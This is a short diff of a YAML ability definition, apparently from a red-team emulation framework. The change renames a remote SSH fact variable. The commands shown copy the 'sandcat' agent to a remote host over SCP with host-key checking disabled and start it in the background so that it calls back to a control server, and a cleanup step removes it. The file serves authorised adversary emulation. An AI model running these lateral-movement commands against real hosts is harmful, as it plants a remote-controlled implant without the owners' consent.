@@ -9,19 +9,19 @@
     darwin:
       sh:
         command: |
-          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&
-          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh_cmd}:~/sandcat.go &&
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh_cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
         cleanup: |
-          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
+          ssh -o ConnectTimeout=3 #{remote.ssh_cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
         payloads:
         - sandcat.go-darwin
     linux:
       sh:
         command: |
-          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&
-          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh_cmd}:~/sandcat.go &&
+          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh_cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
         cleanup: |
-          ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
+          ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh_cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
         payloads:
         - sandcat.go-linux
   singleton: True
